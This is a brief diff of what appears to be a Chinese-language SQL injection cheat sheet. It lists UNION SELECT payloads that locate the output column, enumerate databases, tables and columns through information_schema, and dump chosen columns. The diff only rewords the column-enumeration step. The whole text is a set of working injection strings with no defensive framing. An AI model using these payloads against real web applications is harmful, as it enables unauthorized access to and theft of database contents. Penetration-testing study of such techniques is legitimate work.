@@ -9,7 +9,7 @@
 显示位置: 参数 union select num1，num2，..,NUM，参数要强制报错，才能显示返回数据的位置
 查询库: union select num1,group_concat(schema_name) from information_schema.schemata
 查询表: union select num1,group_concat(table_name) from information_schema.tables where table_schema=database()
-查询列: union select num1,group_concat(column_name) from information_schema.columns where table_name = 表名,表名要么加引号,要么改为十六进制
+查询列: union select num1,group_concat(column_name) from information_schema.columns where table_name='表名',或者表名十六进制
 查数据: union select num1,concat_ws(0x7e,列名,列名) from 库名.表名
 ```
 
